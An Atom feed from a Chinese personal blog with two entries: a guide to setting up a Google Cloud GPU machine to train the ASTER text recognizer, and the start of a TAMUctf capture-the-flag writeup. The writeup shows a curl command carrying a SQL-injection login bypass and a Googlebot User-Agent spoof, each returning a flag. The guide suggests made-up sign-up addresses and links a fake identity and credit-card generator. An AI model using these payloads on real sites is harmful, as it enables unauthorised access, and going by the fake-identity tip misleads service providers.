<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>闲言语</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://findneo.github.io/"/>
  <updated>2019-03-11T12:12:27.653Z</updated>
  <id>https://findneo.github.io/</id>
  
  <author>
    <name>findneo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用谷歌云进行深度学习训练，以aster为例</title>
    <link href="https://findneo.github.io/190308-run-aster-on-gce-or-locally/"/>
    <id>https://findneo.github.io/190308-run-aster-on-gce-or-locally/</id>
    <published>2019-03-08T08:33:07.000Z</published>
    <updated>2019-03-11T12:12:27.653Z</updated>
    
    <content type="html"><![CDATA[<p>光阴似箭，我也做起了毕业设计。随波逐流，我也玩起了深度学习。</p><p>深度学习需要较强的计算能力，在网络上找了一圈，列出一些可用的方案。</p><ul><li><a href="https://www.jikecloud.net" target="_blank" rel="noopener">极客云</a></li><li><a href="https://console.cloud.google.com/freetrial/signup/tos" target="_blank" rel="noopener">谷歌云</a> 。提供一年免费试用，但需要外币信用卡。</li><li>谷歌的<a href="https://www.138vps.com/jc/1325.html" target="_blank" rel="noopener">Colaboratory</a> </li><li><a href="https://net.xmu.edu.cn/19/47/c17463a334151/page.htm" target="_blank" rel="noopener">厦大HPC</a> </li><li><a href="https://item.taobao.com/item.htm?id=572068150187" target="_blank" rel="noopener">淘宝西电机房等</a> </li><li><a href="https://cloud.baidu.com/product/bdl.html" target="_blank" rel="noopener">百度深度学习平台</a> </li><li><a href="https://amazonaws-china.com/cn/free/" target="_blank" rel="noopener">AWS</a></li><li><a href="https://www.deepbrainchain.org/" target="_blank" rel="noopener">DeepBrain Chain</a></li><li>美团云 售罄</li><li><a href="https://blog.csdn.net/sinat_36256646/article/details/80745792" target="_blank" rel="noopener">滴滴云</a></li><li><a href="https://www.huaweicloud.com/product/hmi.html" target="_blank" rel="noopener">华为云</a></li><li>阿里云</li><li>参考文章<ul><li><a href="https://blog.csdn.net/cccat6/article/details/79057746" target="_blank" rel="noopener">机器学习深度学习云GPU资源与对比</a></li><li><a href="https://www.zhihu.com/question/51362855" target="_blank" rel="noopener">有没有云端的深度学习计算服务？</a>  </li></ul></li></ul><h1 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h1><p>在谷歌云上搭建起 <strong>Ubuntu16.04 + Python3.5 + tensorflow-gpu-1.4 + CUDA v8 + cuDNN v6</strong> 的环境。</p><h2 id="申请试用谷歌云"><a href="#申请试用谷歌云" class="headerlink" title="申请试用谷歌云"></a>申请试用谷歌云</h2><p>地址可随意填，记录两个。</p><p><code>台中市大甲区大甲里 邮编：43749</code> </p><p><code>California(加利福尼亚省) Adelanto(阿德兰托市) 邮编[ADELANTO CA 92301]</code> </p><h2 id="新建虚拟机"><a href="#新建虚拟机" class="headerlink" title="新建虚拟机"></a>新建虚拟机</h2><p>进入Google Cloud Platform -&gt; Compute Engine -&gt; VM 实例 ，通过“创建实例”新建一台虚拟机。</p><ul><li>机器类型中选择自定义来添加GPU数量和类型。</li><li>需要先按提示申请升级账户才能进行上述操作。很快会有邮件反馈申请成功。</li><li>自定义磁盘容量，防火墙允许流量。</li><li>点击创建得到一台全新的云端虚拟机。</li></ul><h2 id="远程访问"><a href="#远程访问" class="headerlink" title="远程访问"></a>远程访问</h2><ul><li>添加静态外部IP地址。在VM实例页面，实例右侧的设置处点击查看网络详情即可。</li><li>在Compute Engine -&gt; 元数据 中修改SSH 密钥。使用XHSELL或命令行工具生成密钥对后在云端按指定格式添加公钥，然后可在本地用私钥远程登陆。</li></ul><h2 id="安装Anaconda"><a href="#安装Anaconda" class="headerlink" title="安装Anaconda"></a>安装Anaconda</h2><ul><li><p><code>wget https://repo.continuum.io/archive/Anaconda3-4.2.0-Linux-x86_64.sh</code></p></li><li><p><code>chmod +x Anaconda3-4.2.0-Linux-x86_64.sh</code></p></li><li><p><code>./Anaconda3-4.2.0-Linux-x86_64.sh</code> 按提示选择，对于是否添加到PATH记得选yes。</p></li><li><p><code>source ~/.bashrc</code> 使conda等命令生效。</p></li><li><p><code>conda create -n tensorflow python=3.5</code>  建立虚拟环境。</p></li><li><p><code>source activate tensorflow</code> 激活环境。</p></li><li><p><code>pip install --ignore-installed --upgrade tensorflow-gpu==1.4.0</code> 安装tensorflow。</p></li><li><p><code>lspci -vnn | grep VGA -A 12</code> 查看显卡类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(tensorflow) dfindneo@gaster:~/tf/aster/c_ops$ lspci -vnn | grep VGA -A 12</span><br><span class="line">00:03.0 Non-VGA unclassified device [0000]: Red Hat, Inc. Virtio SCSI [1af4:1004]</span><br><span class="line">        Subsystem: Red Hat, Inc. Virtio SCSI [1af4:0008]</span><br><span class="line">        Physical Slot: 3</span><br><span class="line">        Flags: bus master, fast devsel, latency 0, IRQ 11</span><br><span class="line">        I/O ports at c080 [size=64]</span><br><span class="line">        Memory at fd000000 (32-bit, non-prefetchable) [size=128]</span><br><span class="line">        Capabilities: &lt;access denied&gt;</span><br><span class="line">        Kernel driver <span class="keyword">in</span> use: virtio-pci</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00:04.0 3D controller [0302]: NVIDIA Corporation GP100GL [Tesla P100 PCIe 16GB] [10de:15f8] (rev a1)</span><br><span class="line">        Subsystem: NVIDIA Corporation Device [10de:118f]</span><br><span class="line">        Physical Slot: 4</span><br><span class="line">        Flags: fast devsel, IRQ 11</span><br></pre></td></tr></table></figure></li></ul><h2 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h2><ul><li><p>访问<a href="https://www.nvidia.com/Download/index.aspx?lang=en-us" target="_blank" rel="noopener">NVIDIA官网</a> ，选择配置。<br><img src="1552054146667.png" alt="1552054146667"></p></li><li><p>点击search，看到对应的版本是384.66<br><img src="1552054275727.png" alt="1552054275727"></p></li><li><p>安装驱动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:graphics-drivers/ppa  </span><br><span class="line">sudo apt-get update  </span><br><span class="line">sudo apt-get install nvidia-384 <span class="comment">#此处要根据上面查询到的版本适当更改</span></span><br><span class="line">sudo apt-get install mesa-common-dev  </span><br><span class="line">sudo apt-get install freeglut3-dev</span><br><span class="line">sudo reboot -h now</span><br></pre></td></tr></table></figure></li><li><p>重启后可以使用<code>nvidia-smi</code> 命令查看是否安装成功。<br><img src="1552054400444.png" alt="1552054400444"></p></li></ul><h2 id="安装CUDA8-0"><a href="#安装CUDA8-0" class="headerlink" title="安装CUDA8.0"></a>安装CUDA8.0</h2><ul><li>我使用<code>sudo apt install nvidia-cuda-toolkit</code> 安装的CUDA是7.?版本的，使用<code>sudo apt remove nvidia-cuda*</code>  卸载掉了。</li><li>要安装CUDAv8.0，在<a href="https://developer.nvidia.com/cuda-80-ga2-download-archive" target="_blank" rel="noopener">这个页面</a>选择系统、架构、发行版及其版本，安装类型可选择runfile。如果是Ubuntu16.04，可直接 <code>wget https://developer.nvidia.com/compute/cuda/8.0/Prod2/local_installers/cuda_8.0.61_375.26_linux-run</code> ，然后 <code>sh  cuda_8.0.61_375.26_linux-run</code>  。</li><li>执行 <code>cd ~/NVIDIA_CUDA-8.0_Samples/1_Utilities/deviceQuery &amp;&amp; make &amp;&amp; ./deviceQuery</code> 。如果输出末尾有PASS字样，表示安装成功。</li><li>使用 <code>nvcc --version</code> 查看版本信息。<br><img src="1552056076810.png" alt="1552056076810"> </li></ul><h2 id="安装cuDNN6-0"><a href="#安装cuDNN6-0" class="headerlink" title="安装cuDNN6.0"></a>安装cuDNN6.0</h2><ul><li>登陆账号后访问 <code>https://developer.nvidia.com/compute/machine-learning/cudnn/secure/v6/prod/8.0_20170307/cudnn-8.0-linux-x64-v6.0-tgz</code>  ，点击下载，在chrome浏览器中按CTRL+J查看真实下载链接，暂停下载，然后在shell里wget该链接即可。下载后重命名文件为<code>cudnn-8.0-linux-x64-v6.0.tgz</code> 。</li><li><code>tar xzf cudnn-8.0-linux-x64-v6.0.tgz</code><br><code>sudo cp cuda/include/cudnn.h /usr/local/cuda/include/</code><br><code>sudo cp cuda/lib64/libcudnn* /usr/local/cuda/lib64/</code><br><code>sudo chmod a+r /usr/local/cuda/include/cudnn.h</code><br><code>sudo chmod a+r /usr/local/cuda/lib64/libcudnn*</code> </li><li>安装完成<br><img src="1552056065910.png" alt="1552056065910"></li></ul><p>到此为止深度学习的基本环境已经安装完成。可以在Compute Engine -&gt; 快照 中建立一个快照。</p><p>接下来记录想要复现和改进的模型 <code>aster</code>  的基本环境配置。</p><h1 id="ASTER环境"><a href="#ASTER环境" class="headerlink" title="ASTER环境"></a>ASTER环境</h1><h2 id="激活虚拟环境并安装依赖"><a href="#激活虚拟环境并安装依赖" class="headerlink" title="激活虚拟环境并安装依赖"></a>激活虚拟环境并安装依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> activate tensorflow</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install git cmake libcupti-dev build-essential protobuf-compiler unzip</span><br><span class="line">pip install --user protobuf tqdm numpy editdistance Pillow scipy matplotlib edit_distance</span><br></pre></td></tr></table></figure><h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir tf &amp;&amp; <span class="built_in">cd</span> tf</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/bgshih/aster.git</span><br></pre></td></tr></table></figure><h2 id="按照readme依次完成三步配置"><a href="#按照readme依次完成三步配置" class="headerlink" title="按照readme依次完成三步配置"></a>按照readme依次完成三步配置</h2><p>①<code>Go to c_ops/ and run build.sh to build the custom operators</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tf/aster/c_ops</span><br><span class="line">chmod +x build.sh</span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure><p><img src="1552093922587.png" alt="1552093922587"></p><p><img src="1552092594436.png" alt="1552092594436"></p><p>②<code>Execute protoc aster/protos/*.proto --python_out=. to build the protobuf files</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tf</span><br><span class="line">protoc aster/protos/*.proto --python_out=.</span><br></pre></td></tr></table></figure><p><img src="1552092638172.png" alt="1552092638172"></p><p>③<code>Add /path/to/aster to PYTHONPATH, or set this variable for every run</code> </p><p>在<code>~/.bashrc</code> 末尾加两行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PYTHONPATH=&quot;$&#123;PYTHONPATH&#125;:/home/neo/tf/aster&quot;</span><br><span class="line">source activate tensorflow</span><br></pre></td></tr></table></figure><h2 id="下载作者提供的模型"><a href="#下载作者提供的模型" class="headerlink" title="下载作者提供的模型"></a>下载作者提供的模型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tf/aster/experiments/demo/</span><br><span class="line">wget  https://github.com/bgshih/aster/releases/download/v1.0.1/model-demo.zip</span><br><span class="line">unzip model-demo.zip</span><br></pre></td></tr></table></figure><h2 id="运行demo"><a href="#运行demo" class="headerlink" title="运行demo"></a>运行demo</h2><p> <code>python aster/demo.py</code> </p><p><img src="1552079776694.png" alt="1552079776694"></p><h2 id="数据集下载"><a href="#数据集下载" class="headerlink" title="数据集下载"></a>数据集下载</h2><h3 id="cute80"><a href="#cute80" class="headerlink" title="cute80"></a>cute80</h3><ul><li><a href="http://cs-chan.com/downloads_CUTE80_dataset.html" target="_blank" rel="noopener">主页</a> </li><li>下载：<a href="http://cs-chan.com/source/CUTE80_Dataset.zip" target="_blank" rel="noopener">CUTE80_Dataset.zip</a> (44 MB) </li></ul><h3 id="ic03"><a href="#ic03" class="headerlink" title="ic03"></a>ic03</h3><p><a href="http://www.iapr-tc11.org/mediawiki/index.php/ICDAR_2003_Robust_Reading_Competitions" target="_blank" rel="noopener">下载</a> </p><h3 id="ic13"><a href="#ic13" class="headerlink" title="ic13"></a>ic13</h3><ul><li><a href="http://dagdata.cvc.uab.es/icdar2013competition/?ch=2&amp;com=downloads" target="_blank" rel="noopener">主页</a> </li><li><a href="http://rrc.cvc.uab.es/?ch=2&amp;com=downloads" target="_blank" rel="noopener">下载</a> （注册账号后可见）</li></ul><h3 id="ic15"><a href="#ic15" class="headerlink" title="ic15"></a>ic15</h3><ul><li><a href="http://rrc.cvc.uab.es/?ch=4" target="_blank" rel="noopener">主页</a> </li><li><a href="http://rrc.cvc.uab.es/?ch=4&amp;com=downloads" target="_blank" rel="noopener">下载</a> （注册账号后可见）</li><li>文件说明</li></ul><p><strong><em>Downloads - Incidental Scene Text</em></strong><br>Download below the training dataset and associated ground truth information for each of the Tasks.</p><hr><p><strong><em>Task 4.1: Text Localization (2015 edition)</em></strong><br><strong>Training Set</strong><br>Training Set Images (88.5MB).- 1000 images obtained with wearable cameras</p><p>Training Set Localisation and Transcription Ground Truth (157KB).- 1000 text files with word level localisation and transcription ground truth</p><p><strong>Test Set</strong><br>Test Set Images (43.3MB).- 500 images obtained with wearable cameras. You can submit your results for this Task over the images of the test set through the My Methods section.</p><p>Test Set Ground Truth (244Kb). - 500 text files with text localisation bounding boxes for the images of the test set.</p><hr><p><strong><em>Task 4.2: Text Segmentation (N/A)</em></strong><br>Not available.</p><hr><p><strong><em>Task 4.3: Word Recognition (2015 edition)</em></strong><br><strong>Training Set</strong><br>Training Set Word Images, along with Transcriptions Ground truth (40.5MB).- ~4468 cut out word images corresponding to the axis oriented bounding boxes of the words are provided along with a single text file with the relative coordinates of the bounding shape within each word image. Transcription ground truth is provided in a single txt file.</p><p><strong>Test Set</strong><br>Test Set Word Images (21.5MB).- 2077 cut out word images corresponding to the axis oriented bounding boxes of the words are provided along with a single text file with the relative coordinates of the bounding shape within each word image. You can submit your results for this Task over the images of the test set through the My Methods section.</p><p>Test Set Ground Truth (49Kb). - A single text file with the transcriptions of the 2077 images of the test set. Each line corresponds to an image of the test set.</p><hr><p><strong><em>Task 4.4: End to End (2015 edition)</em></strong><br><strong>Training Set</strong><br>Training Set Images (88.5MB).- 1000 images obtained with wearable cameras</p><p>Training Set Vocabulary (16KB).- Vocabulary of all words (words of 3 characters or longer comprising only letters) appearing in the training set</p><p>Training Set Per-image Vocabularies (504KB).- Vocabularies of 100 words per image, comprising the words appearing in the image plus distractors</p><p>Training Set Localisation and Transcription Ground Truth (157KB).- 1000 text files with word level localisation and transcription ground truth</p><p><strong>Test Set</strong><br>Test Set Images (43.3MB).- 500 images obtained with wearable cameras. You can submit your results for this Task over the images of the test set through the My Methods section.</p><p>Test Set Vocabulary (8KB).- Vocabulary of all words (words of 3 characters or longer comprising only letters) appearing in the test set</p><p>Test Set Per-image Vocabularies (248KB).- Vocabularies of 100 words per image, comprising the words appearing in the image plus distractors</p><p>Test Set Ground Truth (244 Kb). - 500 text files with text localisation bounding boxes for the images of the test set.</p><hr><p><strong><em>Other</em></strong><br> Generic Vocabulary (796 KB).- A vocabulary of about 90 k words derived from the dataset publicly available here. Please consult [1,2] for further information as well as the disclaimer in the vocabulary file itself.</p><h3 id="iiit5k"><a href="#iiit5k" class="headerlink" title="iiit5k"></a>iiit5k</h3><ul><li><a href="http://cvit.iiit.ac.in/projects/SceneTextUnderstanding/IIIT5K.html" target="_blank" rel="noopener">主页</a> </li><li>下载：<a href="http://cvit.iiit.ac.in/projects/SceneTextUnderstanding/IIIT5K-Word_V3.0.tar.gz" target="_blank" rel="noopener">IIIT5K-Word_V3.0.tar.gz</a> (106 MB) </li></ul><h3 id="svt"><a href="#svt" class="headerlink" title="svt"></a>svt</h3><ul><li><a href="http://vision.ucsd.edu/~kai/svt/" target="_blank" rel="noopener">主页</a></li><li>下载：<a href="http://vision.ucsd.edu/~kai/svt/svt.zip" target="_blank" rel="noopener">Street View Text </a>(118MB)</li></ul><h3 id="synth90k"><a href="#synth90k" class="headerlink" title="synth90k"></a>synth90k</h3><ul><li><a href="http://www.robots.ox.ac.uk/~vgg/data/text/" target="_blank" rel="noopener">主页</a></li><li>下载：<a href="http://www.robots.ox.ac.uk/~vgg/data/text/mjsynth.tar.gz" target="_blank" rel="noopener">mjsynth.tar.gz</a> ( 10 GB )，解压后约34 G，生成的 tfrecord 约16 G。</li></ul><p><img src="1552092702860.png" alt="1552092702860"></p><h3 id="synthtext"><a href="#synthtext" class="headerlink" title="synthtext"></a>synthtext</h3><ul><li><a href="http://www.robots.ox.ac.uk/~vgg/data/scenetext/" target="_blank" rel="noopener">主页</a></li><li>下载：<a href="http://www.robots.ox.ac.uk/~vgg/data/scenetext/SynthText.zip" target="_blank" rel="noopener">SynthText.zip</a> 约40G</li></ul><h2 id="数据集处理"><a href="#数据集处理" class="headerlink" title="数据集处理"></a>数据集处理</h2><p>在 <code>~/tf/data</code> 目录下存放数据集文件夹，配置 <code>~/tf/aster/tools/creat_*.py</code> 中的输入输出目录，运行脚本可在数据集同目录下得到tfrecord文件。</p><p><img src="1552092743066.png" alt="1552092743066"></p><h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><p>在<code>~/tf/data/</code>目录下存放<code>tfrecord</code>文件；</p><p> 在<code>~/tf/aster/experiments/</code> 新建<code>train1</code> 文件夹，再在其中新建<code>config</code> 和 <code>log</code> 文件夹；</p><p>在<code>config</code> 文件夹内新建<code>trainval.prototxt</code> ，内容参照<code>~/tf/aster/experiments/demo/config/trainval.prototxt</code> 。</p><p>执行训练命令后在<code>~/tf/aster/experiments/train1/log</code> 目录下生成checkpoint文件等。</p><p>train :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tf/</span><br><span class="line">python aster/train.py --exp_dir=aster/experiments/train1/ --num_clones=2</span><br></pre></td></tr></table></figure><p><img src="1552094702649.png" alt="1552094702649"></p><p>eval :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tf/</span><br><span class="line">python aster/eval.py  --exp_dir=aster/experiments/train1/</span><br></pre></td></tr></table></figure><p><img src="1552093439964.png" alt="1552093439964"></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="提高访问速度"><a href="#提高访问速度" class="headerlink" title="提高访问速度"></a>提高访问速度</h2><p>如果是位于国内的服务器，可更改部分操作以提高访问速度。</p><h3 id="修改Ubuntu更新源"><a href="#修改Ubuntu更新源" class="headerlink" title="修改Ubuntu更新源"></a>修改Ubuntu更新源</h3><p>编辑Ubuntu16.04的 <code>/etc/apt/source.list</code> 为以下内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span><br></pre></td></tr></table></figure><h3 id="使用ssh"><a href="#使用ssh" class="headerlink" title="使用ssh"></a>使用ssh</h3><p><code>sudo apt update &amp;&amp; sudo apt install openssh-server &amp;&amp; sudo service ssh start</code> </p><p><code>sudo apt install lrzsz</code> 安装 lrzsz 后用<code>sz</code> / <code>rz</code> 命令进行小文件传输，大文件用sftp。</p><h3 id="下载Anaconda"><a href="#下载Anaconda" class="headerlink" title="下载Anaconda"></a>下载Anaconda</h3><p><code>wget https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-4.2.0-Linux-x86_64.sh</code> </p><h3 id="修改Anaconda软件源"><a href="#修改Anaconda软件源" class="headerlink" title="修改Anaconda软件源"></a>修改Anaconda软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ </span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes</span><br></pre></td></tr></table></figure><h3 id="修改pip源"><a href="#修改pip源" class="headerlink" title="修改pip源"></a>修改pip源</h3><ul><li><p><code>mkdir -p ~/.pip &amp;&amp; touch ~/.pip/pip.conf</code> </p></li><li><p>修改 <code>~/.pip/pip.conf</code> 内容为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure></li></ul><p>（Windows下为 <code>C:\Users\USERNAME\AppData\Roaming\pip\pip.ini</code> ） </p><h2 id="克隆GitHub公开repo到私有"><a href="#克隆GitHub公开repo到私有" class="headerlink" title="克隆GitHub公开repo到私有"></a>克隆GitHub公开repo到私有</h2><p>GitHub前段时间已经支持免费使用私有仓库，可以将代码仓库镜像自己的私有仓库，更方便地记录代码更改。</p><ul><li><p>sudo apt install git</p></li><li><p>设置git配置和远程访问</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name findneo</span><br><span class="line">git config --global user.email username@gmail.com</span><br><span class="line">ssh-keygen -t rsa -b 4096 -C <span class="string">"usernameo@gmail.com"</span></span><br></pre></td></tr></table></figure></li><li><p>将~/.ssh/id_rsa.pub添加到GitHub的SSH keys。</p></li><li><p><code>ssh -T git@github.com</code> 测试是否成功</p></li><li><p>mirror 公开仓库 bgshih/aster 到 私有仓库 findneo/myaster</p><ul><li><p>在GitHub新建名为myaster的私有仓库</p></li><li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --bare https://github.com/bgshih/aster.git</span><br><span class="line"><span class="built_in">cd</span> aster.git</span><br><span class="line">git push -mirror https://github.com/findneo/myaster.git</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">rm -rf aster.git</span><br><span class="line">git <span class="built_in">clone</span> git@github.com:findneo/myaster.git</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="protocol-buffers"><a href="#protocol-buffers" class="headerlink" title="protocol buffers"></a>protocol buffers</h2><p>和XML/JSON/Thrift类似，优点在于简单，快，小，后向兼容，语言平台应用无关；缺点在于自解释性不够，不能表示很复杂的结构。</p><p>只要描述proto文件，就可以使用编译器protoc(支持c++/Java/Python)自动生成用于序列化、反序列化、读写对象的操作的代码。</p><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>最后，感谢慷慨借用信用卡的朋友。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.xuezishi.net/" target="_blank" rel="noopener">学姿势 - 校园金融第一站</a> ——学习信用卡相关的姿势 </li><li><a href="http://www.haoweichi.com/" target="_blank" rel="noopener">美国人信息生成，美国身份生成-世界各国身份信息、地址、信用卡生成</a> </li><li><a href="https://developer.nvidia.com/cuda-toolkit-archive" target="_blank" rel="noopener">CUDA 下载</a> </li><li><a href="https://developer.nvidia.com/cudnn" target="_blank" rel="noopener">cuDNN下载</a> </li><li><a href="https://www.nvidia.com/Download/index.aspx?lang=en-us" target="_blank" rel="noopener">NVIDIA显卡驱动下载</a> </li><li><a href="https://www.cnblogs.com/zpcdbky/p/9757821.html" target="_blank" rel="noopener">保姆级教程——Ubuntu16.04 Server下深度学习环境搭建：安装CUDA8.0，cuDNN6.0，Bazel0.5.4，源码编译安装TensorFlow1.4.0(GPU版)</a>  </li><li><a href="https://www.cnblogs.com/pprp/p/9463974.html" target="_blank" rel="noopener">深度学习环境搭建：Tensorflow1.4.0+Ubuntu16.04+Python3.5+Cuda8.0+Cudnn6.0</a> </li><li>论文下载：<a href="http://www.vlrlab.net/admin/uploads/avatars/ASTER_An_Attentional_Scene_Text_Recognizer_with_Flexible_Rectification.pdf" target="_blank" rel="noopener">【PAMI2018】ASTER_An Attentional Scene Text Recognizer with Flexible Rectification.pdf</a> </li><li>代码仓库：<a href="https://github.com/bgshih/aster" target="_blank" rel="noopener">https://github.com/bgshih/aster</a>  </li><li><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">清华大学开源软件镜像站</a> <ul><li><a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/" target="_blank" rel="noopener">国内Anaconda下载</a> </li></ul></li><li><a href="https://repo.continuum.io/archive/" target="_blank" rel="noopener">国际Anaconda下载</a> </li><li><a href="https://help.github.com/en/articles/duplicating-a-repository" target="_blank" rel="noopener">Duplicating a repository</a> </li><li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-gpb/index.html" target="_blank" rel="noopener">Google Protocol Buffer 的使用和原理</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;光阴似箭，我也做起了毕业设计。随波逐流，我也玩起了深度学习。&lt;/p&gt;
&lt;p&gt;深度学习需要较强的计算能力，在网络上找了一圈，列出一些可用的方案。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.jikecloud.net&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TAMUctf writeup</title>
    <link href="https://findneo.github.io/190223-tamuctf/"/>
    <id>https://findneo.github.io/190223-tamuctf/</id>
    <published>2019-02-23T01:19:41.000Z</published>
    <updated>2019-03-17T03:46:01.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Not-Another-SQLi-Challenge"><a href="#Not-Another-SQLi-Challenge" class="headerlink" title="Not Another SQLi Challenge"></a>Not Another SQLi Challenge</h2><p>尝试登陆时页面会发生跳转，可在chrome浏览器开发者工具中的Network栏勾选Preserve log保存报文内容，以便用于burp重放。</p><p>万能密码登录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> -s <span class="string">"http://web1.tamuctf.com/web/login.php"</span> -d <span class="string">"username=admin' or 1=1#&amp;password"</span> | grep -o <span class="string">"gigem&#123;.*&#125;"</span></span><br><span class="line">gigem&#123;f4rm3r5_f4rm3r5_w3<span class="string">'r3_4ll_r16h7&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Robots-Rule"><a href="#Robots-Rule" class="headerlink" title="Robots Rule"></a>Robots Rule</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> <span class="string">"http://web5.tamuctf.com/robots.txt"</span></span><br><span class="line">User-agent: *</span><br><span class="line"></span><br><span class="line">WHAT IS UP, MY FELLOW HUMAN!</span><br><span class="line">HAVE YOU RECEIVED SECRET INFORMATION ON THE DASTARDLY GOOGLE ROBOTS?!</span><br><span class="line">YOU CAN TELL ME, A FELLOW NOT-A-ROBOT!</span><br></pre></td></tr></table></figure><p>按提示伪装成Google机器人访问 robots.txt 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://web5.tamuctf.com/robots.txt"</span> -A <span class="string">"Googlebot/2.1 (+http://www.google.com/bot.html)"</span> -s | grep -o <span class="string">"gigem&#123;.*&#125;"</span></span><br><span class="line">gigem&#123;be3p-bOop_rob0tz_4-lyfe&#125;</span><br></pre></td></tr></table></figure><h2 